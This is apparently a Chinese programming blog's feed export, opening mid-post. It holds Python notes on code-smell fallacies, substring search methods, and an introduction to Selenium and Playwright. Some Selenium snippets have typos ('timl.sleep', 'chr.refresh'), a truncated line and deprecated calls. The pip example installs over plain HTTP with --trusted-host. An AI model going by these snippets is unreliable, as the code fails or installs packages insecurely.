class="hljs-number">6</span></span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">        self.sides = sides</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">        <span class="hljs-keyword">return</span> random.randint(<span class="hljs-number">1</span>, self.sides)</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">d = Dice()</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You rolled a&#x27;</span>, d.roll())</span><br>You rolled a 1<br></code></pre></td></tr></table></figure><p>　　这看起来是条理清晰的代码，但想想实际的需求是什么呢？给出一个1到6的随机数。其实，用一个简单的函数就可以代替整个类：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You rolled a&#x27;</span>, random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>))</span><br>You rolled a 6<br></code></pre></td></tr></table></figure><p>　　同其他语言相比，Python用来组织代码的方法更加随意，它的代码不需要存在于类或者其他模板结构中。如果发现创建对象只是为了进行单一的函数调用，或者类中只包含静态方法，那么这些都是代码的坏味道，警示我们最好还是编写函数。</p><p>　　Python中的函数是通过模块而非类组合在一起的，因为无论怎样，类都必须放在一个模块中，把这些代码放在类中只是给代码增加了一个不必要的壳子。第15~17章将详细地讨论这些面向对象的设计原则。Jack Diederich的PyCon 2012演讲“Stop Writing Classes”（停止编写类）涵盖了其他可能使你的Python代码过于复杂的方式。</p><h2 id="5-9-代码坏味道的谬误"><a href="#5-9-代码坏味道的谬误" class="headerlink" title="5.9　代码坏味道的谬误"></a>5.9　代码坏味道的谬误</h2><p>有些代码的坏味道根本不是真正的坏味道。在学习编程的过程中，你经常会听到一些一知半解的糟糕建议，它们或是断章取义，或是早就过时。那些试图把自己的主观意见当作最佳实践的技术书作者应该为此负责。</p><p>　　你可能已经了解以下这些做法是代码的坏味道，但其实大多数没什么问题，我称之为“代码坏味道的谬误”。它们是你能够且应该忽略的警告，让我们看看其中几个。</p><h3 id="5-9-1-谬误：函数应该仅在末尾处有一个return语句"><a href="#5-9-1-谬误：函数应该仅在末尾处有一个return语句" class="headerlink" title="5.9.1　谬误：函数应该仅在末尾处有一个return语句"></a>5.9.1　谬误：函数应该仅在末尾处有一个<code>return</code>语句</h3><p>这种“一进一出”的想法来自对汇编语言和Fortran语言编程时代的误解。这些语言允许你在子例程（一种类似于函数的结构）的任何一个位置进入（包括程序中间），使得调试子例程的执行部分很困难。函数则没有这个问题（因为执行总是从函数的开头开始的），但这个建议一直被保留了下来，并改编成了“函数和方法应该只有一个<code>return</code>语句，位置在其末尾”。想要保证每个函数或方法只有一个<code>return</code>语句往往需要一系列错综复杂的<code>if-else</code>语句，这可比使用多个<code>return</code>语句要麻烦得多。在一个函数或方法中有多个<code>return</code>语句并无不妥</p><h3 id="5-9-2-谬误：函数最多只能有一个try语句"><a href="#5-9-2-谬误：函数最多只能有一个try语句" class="headerlink" title="5.9.2　谬误：函数最多只能有一个try语句"></a>5.9.2　谬误：函数最多只能有一个<code>try</code>语句</h3><p>　　在通常情况下，“函数和方法应该只做一件事情”是个好建议，但如果把这句话理解为每个异常处理应该放在一个单独的函数中，那就过头了。来看一个函数的例子，它的功能是确认要删除的文件已经不存在：</p><h3 id="5-9-3-谬误：使用flag参数不好"><a href="#5-9-3-谬误：使用flag参数不好" class="headerlink" title="5.9.3　谬误：使用flag参数不好"></a>5.9.3　谬误：使用<code>flag</code>参数不好</h3><p>　　函数调用或者方法调用中的布尔型参数有时被称为<code>flag</code>参数。在编程中，<code>flag</code>是指一个表示二元设置的值，比如“启用”和“禁用”通常用布尔值表示。它可以表示为设置（<code>True</code>）或者清除（<code>False</code>）。</p><p>　　认为函数调用中的<code>flag</code>参数不好是基于这样一个想法：根据<code>flag</code>值的控制，函数包含了两种截然不同的功能，比如下面这个示例：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">def someFunction(flagArgument)</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">if flagArgument</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-comment"># 运行代码……</span><br>    <span class="hljs-attribute">else</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-comment"># 运行截然不同的代码……</span><br></code></pre></td></tr></table></figure><p>　　事实上，如果你的函数真是这样，那应该创建两个函数，而不是让一个参数来决定运行函数的哪一部分代码。但大多数带有<code>flag</code>参数的函数并非如此。比如你可以为<code>sorted()</code>函数的<code>reverse</code>参数传递一个布尔类型的值来决定是正序还是反序。把这个函数分成名为<code>sorted()</code>和<code>reverseSorted()</code>的两个函数并无益处，反而增加了不必要的代码量。所以，认为使用<code>flag</code>参数不好的想法是个谬误。</p><h3 id="5-9-4-谬误：全局变量不好"><a href="#5-9-4-谬误：全局变量不好" class="headerlink" title="5.9.4　谬误：全局变量不好"></a>5.9.4　谬误：全局变量不好</h3><p>　　函数像是程序中的“程序”：它们包含代码，有局部变量，当函数返回时局部变量就不复存在。这跟程序结束后变量就会被遗忘的情况类似。函数是相对隔离的，它们的代码执行结果正确与否仅仅取决于被调用时传递的参数。</p><p>　　但对使用全局变量的函数而言，这种有用的隔离性有所削弱。在函数中使用的每个全局变量都是函数的一个输入，就像参数一样。更多的参数意味着更多的复杂性，也意味着更多的潜在bug。如果程序运行出错是由全局变量中的某个值的异常引起的，那么问题排查会很困难，因为难以确定这个异常值被设定的位置，它可能存在于程序中的任何地方。为了寻找这个异常值出现的原因，你不能只分析函数内部的代码或者函数调用的那行代码，而是必须查看整个程序的代码。出于这个原因，应该限制对全局变量的使用。</p><h3 id="5-9-5-谬误：注释是不必要的"><a href="#5-9-5-谬误：注释是不必要的" class="headerlink" title="5.9.5　谬误：注释是不必要的"></a>5.9.5　谬误：注释是不必要的</h3><p>糟糕的注释确实比没有注释更糟糕。带有过时或者误导性信息的注释不仅不能帮助理解代码，反而会增加程序员的工作量。上述这个潜在的问题有时候被拿来证明“所有注释都是不好的”这一观点。该观点认为，应该尽量使用更具可读性的代码替代注释，甚至代码中压根儿就不该有注释。</p><p>　注释是用英文（或者是程序员所使用的任何语言）编写的，通过它们传递变量、函数和类等名称所不能传递的信息。但编写简明有效的注释并非易事。注释同代码一样，需要重写和多次迭代才能达到完美。在写代码时，程序员是能够同步理解代码的，所以写注释看起来像是画蛇添足。因此，他们倾向于接受“注释是不必要的”这种观点。</p><p>　　而通常情况是程序中的注释太少或者就没有注释，这比注释太多或者具有误导性的情况多得多。拒绝注释就如同在说：“坐飞机飞越大西洋只有99.999991%的安全性，所以我打算游泳。</p><p>可以看下篇</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Python】笔记之判断一个字段串是否包含某一字符串（四）</title>
    <link href="/2024/01/02/614Python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E4%B8%B2%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%E6%9F%90%E4%B8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9B%9B/"/>
    <url>/2024/01/02/614Python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E4%B8%B2%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%E6%9F%90%E4%B8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Python笔记之判断一个字段串是否包含某一字符串"><a href="#Python笔记之判断一个字段串是否包含某一字符串" class="headerlink" title="Python笔记之判断一个字段串是否包含某一字符串"></a>Python笔记之判断一个字段串是否包含某一字符串</h1><h3 id="成员判断之-in"><a href="#成员判断之-in" class="headerlink" title="成员判断之 in"></a>成员判断之 <code>in</code></h3><p>一般用的多的是用in 来判断是否存在 返回<code>Ture</code> 或 <code>False</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;string test string test&quot;</span><br>find1 = <span class="hljs-string">&quot;str&quot;</span><br>find2 = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-built_in">print</span>(find1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>)      <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(find1 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>)  <span class="hljs-comment"># False</span><br></code></pre></td></tr></table></figure><h2 id="使用字符串对象的方法find-、rfind-、index-、rindex"><a href="#使用字符串对象的方法find-、rfind-、index-、rindex" class="headerlink" title="使用字符串对象的方法find()、rfind()、index()、rindex()"></a>使用字符串对象的方法<code>find()</code>、<code>rfind()</code>、<code>index()</code>、<code>rindex()</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;string test string test&quot;</span><br>find1 = <span class="hljs-string">&quot;str&quot;</span><br>find2 = <span class="hljs-string">&quot;test&quot;</span><br> <span class="hljs-comment"># find</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.find(find1))<span class="hljs-comment"># 0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.find(find2))<span class="hljs-comment"># 7</span><br> <br><span class="hljs-comment"># rfind</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.rfind(find1))<span class="hljs-comment"># 12</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.rfind(find2))<span class="hljs-comment"># 19</span><br><br><span class="hljs-comment"># index</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.index(find1))<span class="hljs-comment"># 0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.index(find2))<span class="hljs-comment"># 7</span><br><br><span class="hljs-comment"># rindex</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.rindex(find1))<span class="hljs-comment"># 12</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.rindex(find2))<span class="hljs-comment"># 19</span><br><br><span class="hljs-comment"># count</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.count(find1))<span class="hljs-comment"># 2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>.count(find2))<span class="hljs-comment"># 2</span><br></code></pre></td></tr></table></figure><h2 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h2><ul><li><p>find() 获取值时，如果要查找的值不存在，会返回-1</p></li><li><p>index() 获取值的索引时，如果不存在值，会报错</p></li><li><p>find() 从字符串左边开始查询子字符串匹配到的第一个索引（从0开始）</p></li><li><p>rfind()  从字符串右边开始查询字符串匹配到的第一个索引（从0开始）</p></li><li><p>index() 从字符串左边开始查询子字符串匹配到的第一个索引（从0开始）</p></li><li><p>rindex() 从字符串右边开始查询字符串匹配到的第一个索引（从0开始）</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】之UI自动化初窥</title>
    <link href="/2023/12/25/694Python%E4%B9%8BUI%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%9D%E7%AA%A5/"/>
    <url>/2023/12/25/694Python%E4%B9%8BUI%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%9D%E7%AA%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="UI自动化之Selenium-和-Playwright"><a href="#UI自动化之Selenium-和-Playwright" class="headerlink" title="UI自动化之Selenium 和 Playwright"></a>UI自动化之Selenium 和 Playwright</h1><h1 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>Selenium 是最广泛使用的开源 Web UI（用户界面）自动化测试套件之一。Selenium 支持的语言包括C#，Java，Perl，PHP，Python 和 Ruby。目前，Selenium Web 驱动程序最受 Python 和 C＃欢迎。 Selenium 测试脚本可以使用任何支持的编程语言进行编码，并且可以直接在大多数现代 Web 浏览器中运行。在爬虫领域 selenium 同样是一把利器，能够解决大部分的网页的反爬问题</p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install selenium -i -i http://pypi.douban.com/simple --trusted-host pypi.douban.com<br></code></pre></td></tr></table></figure><p>下载Driver </p><p>需要使用对应的驱动才能打开对应的浏览器</p><h2 id="简单打开浏览器"><a href="#简单打开浏览器" class="headerlink" title="简单打开浏览器"></a>简单打开浏览器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 加载驱动</span><br>driver = webdriver.Chrome()<br><span class="hljs-comment"># 访问网址，</span><br>driver.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><span class="hljs-comment"># 请求 浏览器信息 </span><br>title = driver.title<br><span class="hljs-comment"># 建立等待策略</span><br>driver.implicitly_wait(<span class="hljs-number">0.5</span>)<br><span class="hljs-comment"># 找到搜索框</span><br>input_element = driver.find_<br></code></pre></td></tr></table></figure><h2 id="初始化等简单操作"><a href="#初始化等简单操作" class="headerlink" title="初始化等简单操作"></a>初始化等简单操作</h2><p>1、初始化浏览器、刷新、最大化、后退、前进、截图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-comment"># 加载驱动</span><br>driver = webdriver.Chrome()<br><span class="hljs-comment"># 访问网址，</span><br>driver.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><span class="hljs-comment"># 最大化，</span><br>driver.maximize_window()<br><span class="hljs-comment"># 后退</span><br>driver.back()<br><span class="hljs-comment"># 暂停2s  显式等待</span><br>timl.sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># 前进</span><br>driver.forward()<br><span class="hljs-comment"># 刷新</span><br><span class="hljs-built_in">chr</span>.refresh()<br><span class="hljs-comment"># 截图</span><br>driver.get_screenshot_as_file(<span class="hljs-string">&quot;1.png&quot;</span>)<br><span class="hljs-comment"># 输入框输入内容</span><br>driver.find_element(By.ID,<span class="hljs-string">&#x27;kw&#x27;</span>).send_keys(<span class="hljs-string">&quot;saa&quot;</span>)<br><span class="hljs-comment"># 点击</span><br>driver.find_element(By.ID,<span class="hljs-string">&#x27;su&#x27;</span>).click()<br><span class="hljs-comment">#清除输入框内容</span><br>driver.find_element(By.ID,<span class="hljs-string">&#x27;kw&#x27;</span>).clear()<br><span class="hljs-comment">#关闭浏览器</span><br>driver.close()<br></code></pre></td></tr></table></figure><h2 id="单个元素定位8大【重点】"><a href="#单个元素定位8大【重点】" class="headerlink" title="单个元素定位8大【重点】"></a>单个元素定位8大【重点】</h2><p>定位用什么方法，用driver的find_element寻找元素方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_element</span>(<span class="hljs-params">self, by=By.ID, value: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span></span>) -&gt; WebElement:<br></code></pre></td></tr></table></figure><p>我们，然后在这个方法里面使用By里面的属性by&#x3D;By.XXX</p><p>我们再看一下By里面的属性就知道有几种方式了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">By</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Set of supported locator strategies.&quot;&quot;&quot;</span><br><br>    ID = <span class="hljs-string">&quot;id&quot;</span> <br>    XPATH = <span class="hljs-string">&quot;xpath&quot;</span><br>    LINK_TEXT = <span class="hljs-string">&quot;link text&quot;</span><br>    PARTIAL_LINK_TEXT = <span class="hljs-string">&quot;partial link text&quot;</span><br>    NAME = <span class="hljs-string">&quot;name&quot;</span><br>    TAG_NAME = <span class="hljs-string">&quot;tag name&quot;</span><br>    CLASS_NAME = <span class="hljs-string">&quot;class name&quot;</span><br>    CSS_SELECTOR = <span class="hljs-string">&quot;css selector&quot;</span><br></code></pre></td></tr></table></figure><h3 id="以在百度首页的输入框为例元素定位"><a href="#以在百度首页的输入框为例元素定位" class="headerlink" title="以在百度首页的输入框为例元素定位"></a>以在百度首页的输入框为例元素定位</h3><p><img src="/home/wang/%E5%9B%BE%E7%89%87/2024-03-13_16-03.png" alt="baidu"></p><p>1、通过元素id定位【唯一】</p><p>id定位比较唯一，但是有id的元素少</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">driver = webdriver.Chrome()<br>driver.find_element(By.ID,<span class="hljs-string">&#x27;kw&#x27;</span>).send_keys(<span class="hljs-string">&quot;Selenium是什么&quot;</span>)<br></code></pre></td></tr></table></figure><p>2、通过元素的class</p><p>class name定位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.CLASS_NAME,<span class="hljs-string">&#x27;s_ipt&#x27;</span>).send_keys(<span class="hljs-string">&quot;Selenium是什么&quot;</span>)<br></code></pre></td></tr></table></figure><p>3、通过元素的name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.NAME,<span class="hljs-string">&#x27;wd&#x27;</span>).send_keys(<span class="hljs-string">&quot;Selenium是什么&quot;</span>)<br></code></pre></td></tr></table></figure><p>4、通过元素标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.TAG_NAME, <span class="hljs-string">&quot;lname&quot;</span>)<br></code></pre></td></tr></table></figure><p>5、通过超链接文本–&gt;这个是定位跳转链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.LINK_TEXT, <span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p>6、通过超链接文本（模糊匹配）–&gt;这个是定位跳转链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.PARTIAL_LINK_TEXT, <span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p>7、通过xpath【万能，重点】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.XPATH,<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&quot;Selenium是什么&quot;</span>)<br></code></pre></td></tr></table></figure><p>8、通过css选择器（万能，重点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.CSS_SELECTOR,<span class="hljs-string">&#x27;#kw&#x27;</span>).send_keys(<span class="hljs-string">&quot;Selenium是什么&quot;</span>)<br></code></pre></td></tr></table></figure><p>9、多个元素定位的方法</p><p>与单个元素的定位方式类似，把find_element改成find_elements即可</p><p>10、定位下拉框</p><p>可以下拉选择，也可以直接定位到对应的下拉选项，因为你的目的是为了找到这个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">select_by_index()           <span class="hljs-comment"># 通过索引定位；注意：&gt;index索引是从“0”开始。</span><br>select_by_value()           <span class="hljs-comment"># 通过value值定位，va&gt;lue标签的属性值。</span><br>select_by_visible_text()    <span class="hljs-comment"># 通过文本值定位，即显&gt;示在下拉框的值。</span><br>Select(driver.find_element_by_name(<span class="hljs-string">&quot;姓名&quot;</span>)).select_by_index(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 或者分开写</span><br>a=driver.find_element_by_name(<span class="hljs-string">&quot;姓名&quot;</span>)<br>Select(a).select_by_index(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="针对浏览器的操作"><a href="#针对浏览器的操作" class="headerlink" title="针对浏览器的操作"></a>针对浏览器的操作</h2><p>控制浏览器操作：</p><ul><li>获取当前页面的title标题、url信息</li><li>最大化、最小化浏览器</li><li>控制、获取浏览器的大小（页面大小）</li><li>前进、后退、刷新页面</li><li>执行JS语句</li><li>滚动滑动页面</li><li>截图保存</li></ul><p>获取当前页面的title标题、url信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;标签页title：<span class="hljs-subst">&#123;driver.title&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;标签页url：<span class="hljs-subst">&#123;driver.current_url&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>最大化、最小化浏览器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.maximize_window()<br>driver.minimize_window()<br>driver.fullscreen_window() <span class="hljs-comment"># 全屏</span><br></code></pre></td></tr></table></figure><p>控制、获取浏览器的大小（页面大小）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.set_window_size(<span class="hljs-number">1024</span>, <span class="hljs-number">768</span>)<br><span class="hljs-comment"># 分别获取每个尺寸</span><br>width = driver.get_window_size().get(<span class="hljs-string">&quot;width&quot;</span>)<br>height = driver.get_window_size().get(<span class="hljs-string">&quot;height&quot;</span>)<br><span class="hljs-comment"># 或者存储尺寸并在以后查询它们</span><br>size = driver.get_window_size()<br>width1 = size.get(<span class="hljs-string">&quot;width&quot;</span>)<br>height1 = size.get(<span class="hljs-string">&quot;height&quot;</span>)<br></code></pre></td></tr></table></figure><p>前进、后退、刷新页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 前进</span><br>driver.forward()<br><br><span class="hljs-comment"># 后退</span><br>driver.back()<br><br><span class="hljs-comment"># 刷新</span><br>driver.refresh()<br></code></pre></td></tr></table></figure><p>屏幕截图、元素屏幕截图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.save_screenshot(<span class="hljs-string">&#x27;./image.png&#x27;</span>)<br><span class="hljs-comment"># 元素屏幕截图</span><br>ele = driver.find_element(By.CSS_SELECTOR, <span class="hljs-string">&#x27;h1&#x27;</span>)<br><br><span class="hljs-comment"># Returns and base64 encoded string into image</span><br>ele.screenshot(<span class="hljs-string">&#x27;./image.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="针对元素的简单操作"><a href="#针对元素的简单操作" class="headerlink" title="针对元素的简单操作"></a>针对元素的简单操作</h2><p>常见元素操作包含：</p><ul><li>点击</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.NAME, <span class="hljs-string">&quot;color_input&quot;</span>).click()<br></code></pre></td></tr></table></figure><ul><li>输入内容、清除内容</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">driver.find_element(By.NAME, <span class="hljs-string">&quot;email_input&quot;</span>).clear()<br></code></pre></td></tr></table></figure><ul><li>返回元素尺寸、坐标</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">login_btn = driver.find_element_by_class_name(<span class="hljs-string">&quot;login&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>获取元素标签文本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a_text = driver.find_element_by_tag_name(<span class="hljs-string">&quot;a&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>获取元素属性值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a_attr = driver.find_element_by_class_name(<span class="hljs-string">&quot;mnav&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>检查元素：是否可见、是否可点击、是否已被选择</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 找到 不可见元素</span><br>ant_btn3 = driver.find_element_by_class_name(<span class="hljs-string">&quot;ant-btn3&quot;</span>)<br><span class="hljs-comment"># 找到 可见元素</span><br>ant_btn4 = driver.find_element_by_class_name(<span class="hljs-string">&quot;ant-btn4&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><ul><li>执行操作</li><li>左键、右键单击、双击</li><li>鼠标悬停到元素、偏移处</li><li>长按</li><li>拖动</li></ul><h1 id="Playwright–UI自动化神器【初窥】"><a href="#Playwright–UI自动化神器【初窥】" class="headerlink" title="Playwright–UI自动化神器【初窥】"></a>Playwright–UI自动化神器【初窥】</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>playwright是由微软开发的Web UI自动化测试工具， 支持的浏览器包括：Chromium, Firefox and WebKit，支持的编码语言包括：Node.js、Python、C# 和 Java语言。</p><p>特点：</p><ul><li><p>一、支持所有主流浏览器并跨平台</p><ul><li>跨浏览器：基于Chromium内核的Google Chrome 和 Microsoft Edge浏览器), WebKit内核的Apple Safari 和 Mozilla 